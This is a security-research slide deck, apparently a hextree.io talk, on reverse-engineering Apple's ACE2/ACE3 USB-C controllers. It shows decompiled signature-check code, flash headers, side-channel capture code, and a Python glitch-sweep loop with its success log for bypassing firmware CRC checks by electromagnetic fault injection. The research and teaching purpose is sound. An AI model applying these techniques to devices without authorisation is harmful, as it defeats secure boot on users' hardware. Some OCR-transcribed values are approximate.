00018dce        maybe_memset_segue(destination: &public_key_hash_from_otp, c: 0, count: 0x20)
00018dd2        sub_279cc()
00018de8        int32_t r0_24 = rsa3072(&data_20043bf4, rsa_exponent, 0x20043a74, data_20043a40, data_20043a34 + data_20043a3c)   [highlighted]
00018dee        sub_25276()
00018dfa        maybe_memset_segue(destination: &data_20043bf4, c: 0, count: 0x180)
00018e06        maybe_memset_segue(destination: &data_20043a74, c: 0, count: 0x180)
00018e0e        *r4_1 = 0
00018e10        uint32_t r1_20 = r0_24 << 0x10 u>> 0x18
00018e14        uint32_t r2_2 = zx.d(r0_24.b)
00018e16        int32_t r0_26 = 1
00018e1a        int32_t r5_2
00018e1a        if ((r0_20 & r2_2) != 0)
00018e1c            r5_2 = 1
00018e1a        else if ((r0_21 & r2_2) != 0)
00018c24            r5_2 = 2
00018e22        else if ((r0_21 & r1_20) == 0)

[Status bar] 30 (errors)   5 (warnings)   thumb2   0x18de8-0x18dec (0x4 bytes)

[Bottom-left panel: Cross References]
Cross References
Filter (3)
Code References  {3}
  perform_sig_check  {1}
    00018de8    int32_t r0_24 = rsa3072(&d...   [truncated at panel edge]
  sub_457fc  {2}
    000457fe    void* const var_4 = rsa307...   [truncated at panel edge]
    00045800    void* const var_4 = rsa307...   [truncated at panel edge]

[Caption below screenshot]
...with RSA3072
```

## Slide 70

(But flash contents are not!)

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Window title bar] ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
[Tab] ace_combined.bin.bndb

[Left panel: Symbols, search "rsa"]
Name       Address        Section
rsa3072    0x000008fe4
rsa3072    0x00002515e   (selected)

[Toolbar] Mapped ~   Linear ~   High Level IL ~

int32_t perform_sig_check(char* arg1, int32_t arg2)

00018d2e    maybe_memset_segue(destination: arg1, c: 0, count: 0x40)
00018d32    int32_t r0_10 = data_20043a64
00018d3a    if (r0_10 == 0x140)
00018d3e        data_20043a18 = 6
00018d42    data_20043a64 = r0_10 + 0x40
00018d48    data_20043a5c = data_20043a5c + 1
00018d50    if (zx.d(data_20043a18) != 6)
00018d54        *arg1 = 0x80
00018d5c        arg1[1] = (data_20043a58.w).b + (data_20043a5c.w).b
00018d7c        arg1[2] = 0 | ((zx.d(some_fw_update_struct?!.field_10) + 1) << 0x1e u>> 0x1b).b | (zx.d(some_fw_update_struct?!.f  [line cut off at window edge]
00018d50    else
00018d8a        int32_t var_28_1 = 0
00018d8e        sha256(a1: &data_20043bf4, a2: 0x180, a3: &public_key_hash, a4: 0)
00018d98        load_from_otp(1, &public_key_hash_from_otp, 0x20)
00018da2        int32_t r0_20 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: 0x20)
00018dae        char* r4_1 = load_from_otp(2, &public_key_hash_from_otp, 0x20)
00018db8        int32_t r0_21 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: 0x20)
00018dc4        maybe_memset_segue(destination: &public_key_hash, c: 0, count: 0x20)
00018dce        maybe_memset_segue(destination: &public_key_hash_from_otp, c: 0, count: 0x20)
00018dd2        sub_279cc()
00018de8        int32_t r0_24 = rsa3072(&data_20043bf4, rsa_exponent, 0x20043a74, data_20043a40, data_20043a34 + data_20043a3c)   [highlighted]
00018dee        sub_25276()
00018dfa        maybe_memset_segue(destination: &data_20043bf4, c: 0, count: 0x180)
00018e06        maybe_memset_segue(destination: &data_20043a74, c: 0, count: 0x180)
00018e0e        *r4_1 = 0
00018e10        uint32_t r1_20 = r0_24 << 0x10 u>> 0x18
00018e14        uint32_t r2_2 = zx.d(r0_24.b)
00018e16        int32_t r0_26 = 1
00018e1a        int32_t r5_2
00018e1a        if ((r0_20 & r2_2) != 0)
00018e1c            r5_2 = 1
00018e1a        else if ((r0_21 & r2_2) != 0)
00018c24            r5_2 = 2
00018e22        else if ((r0_21 & r1_20) == 0)

[Status bar] 30 (errors)   5 (warnings)   thumb2   0x18de8-0x18dec (0x4 bytes)

[Bottom-left panel: Cross References]
Cross References
Filter (3)
Code References  {3}
  perform_sig_check  {1}
    00018de8    int32_t r0_24 = rsa3072(&d...   [truncated at panel edge]
  sub_457fc  {2}
    000457fe    void* const var_4 = rsa307...   [truncated at panel edge]
    00045800    void* const var_4 = rsa307...   [truncated at panel edge]

[Caption below screenshot]
(But flash contents are not!)

(Verified pixel-identical to slide 69/00139's code panel; only the caption text differs.)
```

## Slide 71

###### Still found an attack!

Mix of software and hardware Abusable with root Survives full restores…

**hextree** .io

## Slide 72

###### But…

ACE2 is on its way out It doesn't do a whole lot iPhone 15 (Pro) uses successor

**hextree** .io

## Slide 73

# The ACE3

**hextree** .io

## Slide 74

###### ACE3

Texas Instruments SN25A12

**Zero** public information Used in iPhone 15 and MacBook Pro M3 Pro & Max

**hextree** .io

## Slide 75

###### ACE3

Runs a full USB stack ("Port DFU") Has access to some internal busses Interesting potential…

**hextree** .io

## Slide 76

###### ACE3

Doesn't use usbcfwflasher (libAce3Updater.dylib) Different upgrade mechanism on iPhone 15 vs. MacBook Pro 🥲 Updates are personalized

**hextree** .io

## Slide 77

###### Sooooooo… I ordered a MacBook M3 Max

**hextree** .io

## Slide 78

###### … and my vuln doesn't work :(

**hextree** .io

## Slide 79

###### Send it back…

**hextree** .io

## Slide 80

###### Send it back…

###### or…

**hextree** .io

## Slide 81

###### Send it back…

or…

**hextree** .io

## Slide 82

**hextree** .io

## Slide 83

**hextree** .io

## Slide 84

**hextree** .io

## Slide 85

**hextree** .io

## Slide 86

**hextree** .io

## Slide 87

**hextree** .io

## Slide 88

ACE3

**hextree** .io

## Slide 89

SPI Flash

ACE3

**hextree** .io

## Slide 90

SPI Flash

ACE3

Debug
connectors

**hextree** .io

## Slide 91

**hextree** .io

## Slide 92

🥲 Debug port seems disabled

**hextree** .io

## Slide 93

🥲 Debug port seems disabled …so let's dump the flash!

**hextree** .io

## Slide 94

**hextree** .io

## Slide 95

**hextree** .io


> Recovered by OCR — confidence 76/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
< 425:318 ms: 900 ps
Logic 2 [Logic Pro 16 - Disconnected] [m3 ace3 good-boot]
USB-C CC li _ —
®
ps Channel 5 Et
® SPI-MISO
On
® SPI-Clock
@ hextree.io
```

## Slide 96

**hextree** .io

## Slide 97

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Window title bar] M3Flashdump_Verified.bin.bndb — Binary Ninja 4.0.4958-Stable
[Tab] M3Flashdump_...ied.bin.bndb

[Left panel: Types]
Types    [Search types]
Name                                     Size
User Types: M3Flashdump_Verifie...
  ace3_binary_header                     0x40
  ace3_firmware_header                   0x28
  struct_1                               0x0
System Types: M3Flashdump_Verif...
Platform: thumb2

struct ace3_binary_header __packed
{
00    uint32_t binary_size;
04    uint32_t u[0x7];
20    uint32_t binary_crc;
24    uint32_t version;
28    uint32_t boot_config_offset;
2c    uint32_t u2[0x4];
3c    uint32_t header_crc;
40 };

Cross References
Filter (1)
Data References  {1}
  00004040    struct ace3_binary_header d...   [truncated at panel edge]

[Toolbar] Mapped ~   Linear ~   High Level IL ~

0x4000

00004000    struct ace3_firmware_header data_4000 =
00004000    {
00004000        uint32_t ace_id = 0xace00003
00004004        uint32_t ace_version = 0x204000
00004008        uint32_t unknown1 = 0x2800
0000400c        uint32_t ace_binary_start_relative = 0x40
00004010        uint32_t boot_config = 0xa8c0
00004014        uint32_t boot_config_size = 0x27f
00004018        uint32_t im4m_offset = 0xab7f
0000401c        uint32_t im4m_size = 0x77f
00004020        uint32_t ace_binary_size = 0xb2be
00004024        uint32_t ace_binary_crc = 0x19089c3d
00004028    }

00004028    ff ff ff ff ff ff ff ff                          ........
00004030    ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

00004040    struct ace3_binary_header data_4040 =
00004040    {
00004040        uint32_t binary_size = 0xa7dc
00004044        uint32_t u[0x7] =
00004044        {
00004044            [0x0] = 0x00720000
00004048            [0x1] = 0x20051ef4
0000404c            [0x2] = 0x20051ef4
00004050            [0x3] = 0x20051f68
00004054            [0x4] = 0x20047725
00004058            [0x5] = 0x010cb105
0000405c            [0x6] = 0x00200000
00004060        }
00004060        uint32_t binary_crc = 0x3400337d
00004064        uint32_t version = 0x204000
00004068        uint32_t boot_config_offset = 0xa8c0
0000406c        uint32_t u2[0x4] =
0000406c        {
0000406c            [0x0] = 0x20047718
00004070            [0x1] = 0x00000000
00004074            [0x2] = 0x00000000
00004078            [0x3] = 0x00000000
0000407c        }
0000407c        uint32_t header_crc = 0xe8fc067e
00004080    }

[Status bar] 30 (errors)   12 (warnings)   thumb2   0x40c8-0x40ca (0x2 bytes)
```

## Slide 98

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 74/100 on the text kept, 63/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Window title bar] M3Flashdump_Verified.bin.bndb — Binary Ninja 4.0.4958-Stable
[Tab] M3Flashdump_...ied.bin.bndb

[Left panel: Types]
Types    [Search types]
Name                                     Size
User Types: M3Flashdump_Verifie...
  ace3_binary_header                     0x40
  ace3_firmware_header                   0x28
  struct_1                               0x0
System Types: M3Flashdump_Verif...
Platform: thumb2

struct ace3_binary_header __packed
{
00    uint32_t binary_size;
04    uint32_t u[0x7];
20    uint32_t binary_crc;
24    uint32_t version;
28    uint32_t boot_config_offset;
2c    uint32_t u2[0x4];
3c    uint32_t header_crc;
40 };

Cross References
Filter (1)
Data References  {1}
  00004040    struct ace3_binary_header d...   [truncated at panel edge]

[Toolbar] Mapped ~   Linear ~   High Level IL ~

0x4000

00004000    struct ace3_firmware_header data_4000 =
00004000    {
00004000        uint32_t ace_id = 0xace00003
00004004        uint32_t ace_version = 0x204000
00004008        uint32_t unknown1 = 0x2800
0000400c        uint32_t ace_binary_start_relative = 0x40
00004010        uint32_t boot_config = 0xa8c0
00004014        uint32_t boot_config_size = 0x27f
00004018        uint32_t im4m_offset = 0xab7f
0000401c        uint32_t im4m_size = 0x77f
00004020        uint32_t ace_binary_size = 0xb2be
00004024        uint32_t ace_binary_crc = 0x19089c3d   [circled in red]
00004028    }

00004028    ff ff ff ff ff ff ff ff                          ........
00004030    ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

00004040    struct ace3_binary_header data_4040 =
00004040    {
00004040        uint32_t binary_size = 0xa7dc
00004044        uint32_t u[0x7] =
00004044        {
00004044            [0x0] = 0x00720000
00004048            [0x1] = 0x20051ef4
0000404c            [0x2] = 0x20051ef4
00004050            [0x3] = 0x20051f68
00004054            [0x4] = 0x20047725
00004058            [0x5] = 0x010cb105
0000405c            [0x6] = 0x00200000
00004060        }
00004060        uint32_t binary_crc = 0x3400337d   [circled in red]
00004064        uint32_t version = 0x204000
00004068        uint32_t boot_config_offset = 0xa8c0
0000406c        uint32_t u2[0x4] =
0000406c        {
0000406c            [0x0] = 0x20047718
00004070            [0x1] = 0x00000000
00004074            [0x2] = 0x00000000
00004078            [0x3] = 0x00000000
0000407c        }
0000407c        uint32_t header_crc = 0xe8fc067e   [circled in red]
00004080    }

[Status bar] 30 (errors)   12 (warnings)   thumb2   0x40c8-0x40ca (0x2 bytes)

(Verified identical to slide 97/00141 except three CRC-value lines — ace_binary_crc, binary_crc, header_crc — are circled in red on this slide; no additional printed text accompanies the circles.)
```

## Slide 99

###### Can't get it to boot a modified firmware…

**hextree** .io

## Slide 100

###### Either I'm bad at reversing …

**hextree** .io

## Slide 101

Either I'm bad at reversing … … or they are good at engineering

**hextree** .io

## Slide 102

Either I'm bad at reversing … … or they are good at engineering (or both)

**hextree** .io

## Slide 103

###### What I tried…

Software vulnerability Physical SWD access Modifying & switching flash contents Fuzzing

…

**hextree** .io

## Slide 104

###### Sooooo

Completely documented chip No firmware Only some simple commands

**hextree** .io

## Slide 105

###### Sooooo

Completely documented chip No firmware Only some simple commands Time to give up?

**hextree** .io

## Slide 106

###### Fault Injection

**hextree** .io

## Slide 107

###### Fault Injection…

Introduce **faults** into the chip Allows to modify the behavior of the running software Voltage, Laser, BBI, Electro-Magnetic…

**hextree** .io

## Slide 108

###### Fault Injection…

Introduce **faults** into the chip Allows to modify the behavior of the running software Voltage, Laser, BBI, Electro-Magnetic… Often bricks chips…

**hextree** .io

## Slide 109

###### Voltage Fault Injection

3.3V
0V
Power supply

Time

**hextree** .io

## Slide 110

###### Voltage Fault Injection

3.3V
0V
Power supply

Time

**hextree** .io

## Slide 111

###### Voltage Fault Injection

3.3V
Precise delay
0V
Time
Power supply

**hextree** .io

## Slide 112

###### Voltage Fault Injection

Pulse
3.3V
Precise delay
0V
Time
Power supply

**hextree** .io

## Slide 113

###### Voltage Fault Injection

Pretty much requires soldering Removal of capacitors Best performed on potential bypass capacitors More difficult with shared voltage rails

**hextree** .io

## Slide 114

###### EMFI Electro-Magnetic Fault-Injection

**hextree** .io

## Slide 115

###### Electro-Magnetic Fault-Injection

Create high-voltage pulse into a coil This lets us inject current into a very precise location on the chip Skip instructions, change register values, etcpp

**hextree** .io

## Slide 116

###### Electro-Magnetic Fault-Injection

Create high-voltage pulse into a coil This lets us inject current into a very precise location on the chip Skip instructions, change register values, etcpp No target prep necessary!

**hextree** .io

## Slide 117

EMFI

**hextree** .io

## Slide 118

###### EMFI

**hextree** .io

## Slide 119

###### EMFI

**hextree** .io

## Slide 120

###### EMFI

Chip
Hacked!

**hextree** .io

## Slide 121

But we need precise timing on when to inject our glitch…

**hextree** .io

## Slide 122

###### Side Channels

**hextree** .io

## Slide 123

**hextree** .io

## Slide 124

**hextree** .io

## Slide 125

###### **Capture magic chip waves**

**hextree** .io

## Slide 126

**hextree** .io

## Slide 127

**hextree** .io

## Slide 128

Start recording
spectrum on HackRF

**hextree** .io

## Slide 129

Start recording
spectrum on HackRF

Reboot ACE3 via
acetool3

**hextree** .io

## Slide 130

Start recording
spectrum on HackRF
Reboot ACE3 via
acetool3
Get EM recording

**hextree** .io

## Slide 131

**hextree** .io


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
€5 P m3 pro notes } OBO:
diotest copy.ipynb @ radiotest.ipynt @ @ radiotest copy 4.ipynb ® radiotest copy 5.ipyn> @ —@ radiotest copy Z.ipynb @ 0.
@ > @ radistest copy 5.ipynb > ..
ode + Markdown | [> Run All © Restart = Clear All Outputs | [J Variables |S Outine --- A glitching2 (Python 3.11
import matplotlib.pyplot as plt Stane-f
filename = “test_reboot2"
data = np.fronfile(filename, dtype=np. int8)
data_complex = data[::2] + 1j * data[1::2]
# Reshape data for the waterfall plot
num_sanples_per_row = 1024 # This value can be adjusted
num_rows = len(dala_complex) // num_samples_per_row
data_reshaped = data_complex[:num_rows * num_samples_per_row].reshape((num_rows, num_samples_per_row))
# Compute FFT
fft_data = np. fft.fftshift(np.fft.fft(data_reshaped, axis=1), axes=1)
magnitude = 20 * np.log10(np.abs(fft_data))
# Frequency range for the x-axis
sampling_rate = 10e6 # 10 MHz
frequency_start = -sampling_rate / 2 # -5 MHz
frequency_end = sampling_rate / 2 #5 MHz
center_frequency ~ 44366500 # 44.3665 MHz
frequencies = np. linspace(frequency_start, frequency_end, num_samples_per_row) + center_frequency
# Plotting
plt.imshow(magnitude, aspect='auto', extent=[frequencies(®], frequencies(-1], @, num_rows], cmap='viridis')
plt.colorbar(label='"Nagnituce (dB)')
plt.show()
def waterfall_file16(filename):
data = np.fronfile(filename, dtype=np. int16)
data_complex = data[::2] + 1) * data[1::2]
# Reshape data for the waterfall plot
num_sanples_per_row = 1024 # This value can be adjusted
num_rows = len(data_complex) // num_samples_per_row
data_reshaped = data_complex[:num_rows * num_samples_per_row].reshape((num_rows, num_samples_per_row))
# Compute FFT
fft_data = np. fft.fftshift(np. fft.fft(data_reshaped, axis=1), axes=1)
magnitude = 20 * np. log10(np.abs(fft_data))
# Frequency range for the x-axis
sampling_rate = 10e6 # 10 MHz
frequency_start = -sampling_rate / 2 # -5 MHz
frequency_end = sampling_rate / 2 #5 MHz
center_frequency = 44366500 # 44.3665 MHz
frequencies = np. linspace(frequency_start, frequency_end, num_samples_per_row) + center_frequency
# Plotting
plt.xlabel('Frequency (Hz)')
plt.ylabel('Time Index')
plt.title(filename)
plt.show()
```

## Slide 132

**hextree** .io

## Slide 133

**hextree** .io

## Slide 134

**hextree** .io

## Slide 135

**hextree** .io


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HACKRF ONE HARDWARE
eee Identify the Trigger Pins
for HackRF HackRF One has four normally-populated pin headers, three of which are arranged in a 'C’ shape.
On the circuit board these are marked P28, P22, and P20. P28 is the header nearest to the center
of the board. Locate pins 15 (trigger output) and 16 (trigger input) on header P28.
List of Hardware Revisions
Hardware Components
LEDs
Buttons
Connectors
External Clock Interface (CLKIN and
CLKOUT)
Expansion Interface
© Hardware Triggering
Clock Synchronization
Requirements
eonnecd the Trigger Output t to the Trigger Input
Open Your HackRF One
Identify the Trigger Pins First ensure that the two devices share a common ground. This may be accomplished by connecting
Connect the Trigger Output to the one’s CLKIN to the other’s CLKOUT as recommended above. Alternatively, connect a jumper wire
Trigger Input from P28 pin 2 on one HackRF One to P28 pin 2 on the other HackRF One.
Usage
Next use a jumper wire to connect P28 pin 15 (trigger output) on one HackRF One to P28 pin 16
(trigger input) on the other HackRF One.
Additional Devices
& Read the Docs
```

## Slide 136

**hextree** .io


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
D4
DS
D6
Flash MOSI
Flash MISO
Flash Clock
Flash CS
2s
+0.1s
|
+0.2s
+0.3s
@ hextree.io
```

## Slide 137

**hextree** .io


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
D4
Flash MOSI
<
+70 ps
H
+80 ps
+90 ps
2s:96 ms: 800 ps
+10 ps
+20 ps
DS
D/
D6
Flash MISO
Flash Clock
Flash CS
& hextree.io
```

## Slide 138

**hextree** .io

## Slide 139

###### Start recording on CS trigger on HackRF

**hextree** .io

## Slide 140

Start recording on CS
trigger on HackRF

Reboot ACE3 via
acetool3

**hextree** .io

## Slide 141

Start recording on CS trigger on HackRF

Reboot ACE3 via
acetool3
Get perfectly aligned
🥳
recording

**hextree** .io

## Slide 142

**hextree** .io

## Slide 143

**hextree** .io

## Slide 144

**hextree** .io

## Slide 145

Flash chip-select line for trigger

**hextree** .io

## Slide 146

**hextree** .io

## Slide 147

##### Perfect recordings!

**hextree** .io

## Slide 148

**hextree** .io

## Slide 149

**hextree** .io

## Slide 150

**hextree** .io


> Recovered by OCR — confidence 74/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
p4 Flash MOSI
5 Flash MISO
07 Flash Clock
```

## Slide 151

How do we use this side-channel to time our glitch?

**hextree** .io

## Slide 152

Change firmware

**hextree** .io

## Slide 153

Change firmware

Reboot ACE3 via
acetool3 & record

**hextree** .io

## Slide 154

Change firmware
Reboot ACE3 via
acetool3 & record

Compare differences

**hextree** .io

## Slide 155

**hextree** .io

## Slide 156

Try flashing til it
works

**hextree** .io

## Slide 157

Try flashing til it
works

**hextree** .io

## Slide 158

Try flashing til it
works

Measure

**hextree** .io

## Slide 159

Try flashing til it
works

Measure

**hextree** .io

## Slide 160

###### Original Firmware

**hextree** .io

## Slide 161

###### Original Firmware

###### Modified firmware

**hextree** .io

## Slide 162

###### Original Firmware

###### Modified firmware

**hextree** .io

## Slide 163

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 66/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00004000  struct ace3_firmware_header data_4000 =
00004000  {
00004000      uint32_t ace_id = 0xace00003
00004004      uint32_t ace_version = 0x204000
00004008      uint32_t unknown1 = 0x2800
0000400c      uint32_t ace_binary_start_relative = 0x40
00004010      uint32_t boot_config = 0xa8c0
00004014      uint32_t boot_config_size = 0x27f
00004018      uint32_t im4m_offset = 0xab7f
0000401c      uint32_t im4m_size = 0x77f
00004020      uint32_t ace_binary_size = 0xb2be
00004024      uint32_t ace_binary_crc = 0x19089c3d
00004028  }

00004028                              ff ff ff ff ff ff ff ff
00004030  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff

00004040  struct ace3_binary_header data_4040 =
00004040  {
00004040      uint32_t binary_size = 0xa7dc
00004044      uint32_t u[0x7] =
00004044      {
00004044          [0x0] =  0x00720000
00004048          [0x1] =  0x20051ef4
0000404c          [0x2] =  0x20051ef4
00004050          [0x3] =  0x20051f68
00004054          [0x4] =  0x20047725
00004058          [0x5] =  0x010cb105
0000405c          [0x6] =  0x00200000
00004060      }
00004060      uint32_t binary_crc = 0x3400337d
00004064      uint32_t version = 0x204000
00004068      uint32_t boot_config_offset = 0xa8c0
0000406c      uint32_t u2[0x4] =
0000406c      {
0000406c          [0x0] =  0x20047718
00004070          [0x1] =  0x00000000
00004074          [0x2] =  0x00000000
00004078          [0x3] =  0x00000000
0000407c      }
0000407c      uint32_t header_crc = 0xe8fc067e
00004080  }
```

## Slide 164

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 66/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00004000  struct ace3_firmware_header data_4000 =
00004000  {
00004000      uint32_t ace_id = 0xace00003
00004004      uint32_t ace_version = 0x204000
00004008      uint32_t unknown1 = 0x2800
0000400c      uint32_t ace_binary_start_relative = 0x40
00004010      uint32_t boot_config = 0xa8c0
00004014      uint32_t boot_config_size = 0x27f
00004018      uint32_t im4m_offset = 0xab7f
0000401c      uint32_t im4m_size = 0x77f
00004020      uint32_t ace_binary_size = 0xb2be
00004024      uint32_t ace_binary_crc = 0x19089c3d
00004028  }

00004028                              ff ff ff ff ff ff ff ff
00004030  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff

00004040  struct ace3_binary_header data_4040 =
00004040  {
00004040      uint32_t binary_size = 0xa7dc
00004044      uint32_t u[0x7] =
00004044      {
00004044          [0x0] =  0x00720000
00004048          [0x1] =  0x20051ef4
0000404c          [0x2] =  0x20051ef4
00004050          [0x3] =  0x20051f68
00004054          [0x4] =  0x20047725
00004058          [0x5] =  0x010cb105
0000405c          [0x6] =  0x00200000
00004060      }
00004060      uint32_t binary_crc = 0x3400337d
00004064      uint32_t version = 0x204000
00004068      uint32_t boot_config_offset = 0xa8c0
0000406c      uint32_t u2[0x4] =
0000406c      {
0000406c          [0x0] =  0x20047718
00004070          [0x1] =  0x00000000
00004074          [0x2] =  0x00000000
00004078          [0x3] =  0x00000000
0000407c      }
0000407c      uint32_t header_crc = 0xe8fc067e
00004080  }

[Same listing as previous slide, with three fields circled in red: ace_binary_crc = 0x19089c3d, binary_crc = 0x3400337d, and header_crc = 0xe8fc067e]
```

## Slide 165

Original Firmware

## Slide 166

Original Firmware

Wrong first CRC

## Slide 167

###### Original Firmware

Wrong first CRC

Wrong second CRC

## Slide 168

###### Original Firmware

Wrong first CRC

Wrong second CRC

Wrong third CRC

## Slide 169

###### Original Firmware

Wrong third CRC

## Slide 170

###### Original Firmware

###### Wrong third CRC

## Slide 171

###### Original Firmware

Glitch here! Wrong third CRC

## Slide 172

## Slide 173

## Slide 174

## Slide 175

## Slide 176

## Slide 177

## Slide 178

## Slide 179

## Slide 180

## Slide 181

**hextree** .io

## Slide 182

###### ChipSHOUTER

**hextree** .io

## Slide 183

###### ChipSHOUTER

###### ChipWhisperer Husky for triggering

**hextree** .io

## Slide 184

ChipSHOUTER

###### Trigger ChipWhisperer Husky connection for triggering

**hextree** .io

## Slide 185

###### ChipSHOUTER

###### ChipWhisperer Husky for triggering

Trigger connection

Ground Connection

**hextree** .io

## Slide 186

ChipSHOUTER

###### Trigger ChipWhisperer Husky connection for triggering

Ground Connection

Not shown: Days of debugging

**hextree** .io

## Slide 187

**hextree** .io

## Slide 188

###### Attempt  1: Change version string

**hextree** .io

## Slide 189

**hextree** .io

## Slide 190

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io

## Slide 191

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io

## Slide 192

###### `SN2012025 HW00A1 FW002.045.00 ZACE3`

**hextree** .io


> Recovered by OCR — confidence 76/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[research@researchs-MBP aceglitch % sudo hpmdiagnose | grep 0x2f
*
@x@0@82020 3F Bé
*
@x80082060 82 E3
0x8@0082070 66 60
*
```

## Slide 193

**hextree** .io

## Slide 194

Arm Husky  &
ChipSHOUTER

**hextree** .io

## Slide 195

Arm Husky  &
ChipSHOUTER

Reboot ACE3 via acetool3

**hextree** .io

## Slide 196

Arm Husky  &
Reboot ACE3 via
ChipSHOUTER
acetool3

Wait for glitch

**hextree** .io

## Slide 197

Arm Husky  &
ChipSHOUTER

Reboot ACE3 via acetool3

Check status "APP" vs "ADFU"

Wait for glitch

**hextree** .io

## Slide 198

Arm Husky  &
Reboot ACE3 via
ChipSHOUTER
acetool3
Check status
"APP" vs "ADFU"
Wait for glitch

**hextree** .io

## Slide 199

**hextree** .io


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
center = 44793408
pulse = 20
success = False
while not success:
for delay in trange(center - 1000, center + 1000):
setup_husky(delay, pulse)
result = test_ace()
print(f'"{result} {delay} {pulse}")
if result == "APP":
print(f"Success: {delay}")
success = True
break
Python
Python
xtree.io
```

## Slide 200

###### The troubles…

ACE sometimes completely stops responding → Auto-reboot After reboot, MacBook stops charging while one ACE is "bricked" 8 hours, then have to restore ACE3 and start over…

**hextree** .io

## Slide 201

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
✓ 26m 38.5s
37% [progress bar] 736/2000 [26:38<12:52, 1.64it/s]
ADFU 44792408 20
ADFU 44792409 20
ADFU 44792410 20
ADFU 44792411 20
ADFU 44792412 20
ADFU 44792413 20
ADFU 44792414 20
ADFU 44792415 20
ADFU 44792416 20
ADFU 44792417 20
ADFU 44792418 20
ADFU 44792419 20
ADFU 44792420 20
ADFU 44792421 20
ADFU 44792422 20
ADFU 44792423 20
ADFU 44792424 20
ADFU 44792425 20
ADFU 44792426 20
ADFU 44792427 20
ADFU 44792428 20
ADFU 44792429 20
ADFU 44792430 20
ADFU 44792431 20
ADFU 44792432 20

...

ADFU 44793142 20
ADFU 44793143 20
APP 44793144 20
Success: 44793144
```

## Slide 202

###### `SN2012025 HW00A1 FW002.042.00 ZACE3`

**hextree** .io

## Slide 203

🥳 We glitched the ACE3!

**hextree** .io

## Slide 204

###### But…

We can only modify patches We don't know what the patches patch We have no input/output

**hextree** .io

## Slide 205

###### But…

We can only modify patches We don't know what the patches patch We have no input/output But we have the ACE2 firmware…

**hextree** .io

## Slide 206

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 73/100 on the text kept, 63/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00040eee     int32_t r5 = 0
00040ef2     if (data_2004005c_CURRENT_MODE_1 == 'DISC')
00040f84         label_40f84:
00040f84         r5 = 3
00040ef8     else
00040ef8         if (data_2004005c_CURRENT_MODE_1 == 'UFPf')
00040ef8             goto label_40f84
00040efe         if (data_2004005c_CURRENT_MODE_1 == 'DFUf')
00040efe             goto label_40f84
00040f02         var_18 = &data_20042988
00040f08         if (zx.d(data_20042991) == 0)
00040f08             goto label_40f84
00040f10         if (sub_44cc8() == 0)
00040f10             goto label_40f84
00040f28         if (zx.d(**(arg2 + 4)) u>> 7 == 0 || (zx.d(**(arg2 + 4)) u>> 7 != 0 &  [line continues off the right edge of the slide]
00040f40             int32_t data_2004005c_CURRENT_MODE_2 = data_2004005c_CURRENT_MODE  [line continues off the right edge of the slide]
00040f42             if (zx.d(*r6) << 0x1f == 0)
00040f82  [label "ACE3 Flash" overlaid on code]  if (data_2004005c_CURRENT_MODE_2 != 'USBw')
00040f82                 goto label_40f84
00040f88                 data_2005671e = 0
00040f8a                 uint32_t r0_18 = zx.d(*r6)
00040f8c                 data_200424f1 = r0_18.b
00040f8e                 sub_40e14(r0_18, 'USBw', 0, 0x2005671e)
00040f48             else
00040f48                 if (data_2004005c_CURRENT_MODE_2 == 'USBw')
00040f48                     goto label_40f84
00040f4e                 if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
00040f52                     *(var_18 + 0x19) = 0
00040f58                 if (var_20 == 7)
00040f5e                     var_20 = 0x183
00040f62                     sub_35d22(&var_20)
